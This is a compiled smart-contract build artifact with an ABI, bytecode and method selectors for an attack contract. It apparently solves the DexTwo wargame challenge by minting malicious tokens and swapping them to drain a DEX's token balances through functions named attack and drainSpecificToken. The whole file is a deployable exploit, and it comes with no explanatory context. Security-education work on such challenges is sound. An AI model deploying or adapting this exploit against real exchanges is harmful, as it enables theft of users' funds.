{"abi":[{"type":"constructor","inputs":[{"name":"_dexTwo","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"checkSetup","inputs":[],"outputs":[{"name":"token1","type":"address","internalType":"address"},{"name":"token2","type":"address","internalType":"address"},{"name":"bal1","type":"uint256","internalType":"uint256"},{"name":"bal2","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"dexTwo","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IDexTwo"}],"stateMutability":"view"},{"type":"function","name":"drainSpecificToken","inputs":[{"name":"targetToken","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"malToken1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract MaliciousTokenSimple"}],"stateMutability":"view"},{"type":"function","name":"malToken2","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract MaliciousTokenSimple"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b50604051610e77380380610e7783398101604081905261002e916100f5565b5f80546001600160a01b0383166001600160a01b0319918216179091556003805490911633179055604051610062906100e8565b604051809103905ff08015801561007b573d5f5f3e3d5ffd5b50600180546001600160a01b0319166001600160a01b03929092169190911790556040516100a8906100e8565b604051809103905ff0801580156100c1573d5f5f3e3d5ffd5b50600280546001600160a01b0319166001600160a01b039290921691909117905550610122565b61044080610a3783390190565b5f60208284031215610105575f5ffd5b81516001600160a01b038116811461011b575f5ffd5b9392505050565b6109088061012f5f395ff3fe608060405234801561000f575f5ffd5b506004361061007a575f3560e01c80639e5faafc116100585780639e5faafc146100f3578063c4feaf6d146100fd578063e054d46514610110578063f462ec2f14610123575f5ffd5b8063396b16001461007e5780637bbe92f6146100ad5780638da5cb5b146100e0575b5f5ffd5b5f54610090906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6100b5610136565b604080516001600160a01b0395861681529490931660208501529183015260608201526080016100a4565b600354610090906001600160a01b031681565b6100fb610324565b005b600254610090906001600160a01b031681565b600154610090906001600160a01b031681565b6100fb61013136600461085f565b6104ac565b5f5f5f5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610189573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101ad9190610881565b93505f5f9054906101000a90046001600160a01b03166001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101fe573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102229190610881565b92506001600160a01b038416156102a1575f546040516370a0823160e01b81526001600160a01b039182166004820152908516906370a0823190602401602060405180830381865afa15801561027a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061029e919061089c565b91505b6001600160a01b0383161561031e575f546040516370a0823160e01b81526001600160a01b039182166004820152908416906370a0823190602401602060405180830381865afa1580156102f7573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061031b919061089c565b90505b90919293565b6003546001600160a01b031633146103705760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b60448201526064015b60405180910390fd5b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103c0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103e49190610881565b90505f5f5f9054906101000a90046001600160a01b03166001600160a01b03166325be124e6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610436573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061045a9190610881565b90506001600160a01b03821615610482576001546104829083906001600160a01b031661050d565b6001600160a01b038116156104a8576002546104a89082906001600160a01b031661050d565b5050565b6003546001600160a01b031633146104f35760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b6044820152606401610367565b60015461050a9082906001600160a01b031661050d565b50565b5f80546040516370a0823160e01b81526001600160a01b039182166004820152908416906370a0823190602401602060405180830381865afa158015610555573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610579919061089c565b90508015610846575f546040516340c10f1960e01b81526001600160a01b03918216600482015260016024820152908316906340c10f19906044015f604051808303815f87803b1580156105cb575f5ffd5b505af11580156105dd573d5f5f3e3d5ffd5b50506040516340c10f1960e01b8152306004820152602481018490526001600160a01b03851692506340c10f1991506044015f604051808303815f87803b158015610626575f5ffd5b505af1158015610638573d5f5f3e3d5ffd5b50505f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b03918216600482015260248101859052908516925063095ea7b391506044016020604051808303815f875af11580156106a4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106c891906108b3565b505f546040517fdf791e500000000000000000000000000000000000000000000000000000000081526001600160a01b0384811660048301528581166024830152604482018490529091169063df791e50906064015f604051808303815f87803b158015610734575f5ffd5b505af1158015610746573d5f5f3e3d5ffd5b50506003546040516370a0823160e01b81523060048201526001600160a01b03878116945063a9059cbb93509091169083906370a0823190602401602060405180830381865afa15801561079c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107c0919061089c565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303815f875af1158015610820573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061084491906108b3565b505b505050565b6001600160a01b038116811461050a575f5ffd5b5f6020828403121561086f575f5ffd5b813561087a8161084b565b9392505050565b5f60208284031215610891575f5ffd5b815161087a8161084b565b5f602082840312156108ac575f5ffd5b5051919050565b5f602082840312156108c3575f5ffd5b8151801515811461087a575f5ffdfea264697066735822122017611b75d60c55bbc6aa37e108643edae7040f195f0f64e62f079b08e1a27ec064736f6c634300081c00336080604052348015600e575f5ffd5b50600280546001600160a01b031916331790556104128061002e5f395ff3fe608060405234801561000f575f5ffd5b506004361061006f575f3560e01c806370a082311161004d57806370a08231146100c35780638da5cb5b146100f9578063a9059cbb14610124575f5ffd5b8063095ea7b31461007357806323b872dd1461009b57806340c10f19146100ae575b5f5ffd5b610086610081366004610307565b610137565b60405190151581526020015b60405180910390f35b6100866100a936600461032f565b610164565b6100c16100bc366004610307565b6101ff565b005b6100eb6100d1366004610369565b6001600160a01b03165f9081526020819052604090205490565b604051908152602001610092565b60025461010c906001600160a01b031681565b6040516001600160a01b039091168152602001610092565b610086610132366004610307565b610292565b335f9081526001602081815260408084206001600160a01b03871685529091529091208290555b92915050565b6001600160a01b0383165f9081526001602090815260408083203384529091528120805483919083906101989084906103b6565b90915550506001600160a01b0384165f90815260208190526040812080548492906101c49084906103b6565b90915550506001600160a01b0383165f90815260208190526040812080548492906101f09084906103c9565b90915550600195945050505050565b6002546001600160a01b03163314610277576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600a60248201527f4f6e6c79206f776e657200000000000000000000000000000000000000000000604482015260640160405180910390fd5b6001600160a01b039091165f90815260208190526040902055565b335f908152602081905260408120805483919083906102b29084906103b6565b90915550506001600160a01b0383165f90815260208190526040812080548492906102de9084906103c9565b909155506001949350505050565b80356001600160a01b0381168114610302575f5ffd5b919050565b5f5f60408385031215610318575f5ffd5b610321836102ec565b946020939093013593505050565b5f5f5f60608486031215610341575f5ffd5b61034a846102ec565b9250610358602085016102ec565b929592945050506040919091013590565b5f60208284031215610379575f5ffd5b610382826102ec565b9392505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b8181038181111561015e5761015e610389565b8082018082111561015e5761015e61038956fea26469706673582212203b1c58aaf889c7cfaf6081c5d7224827a038d07d68c2a28477a0f0710387ca4c64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","checkSetup()":"7bbe92f6","dexTwo()":"396b1600","drainSpecificToken(address)":"f462ec2f","malToken1()":"e054d465","malToken2()":"c4feaf6d","owner()":"8da5cb5b"},"id":0}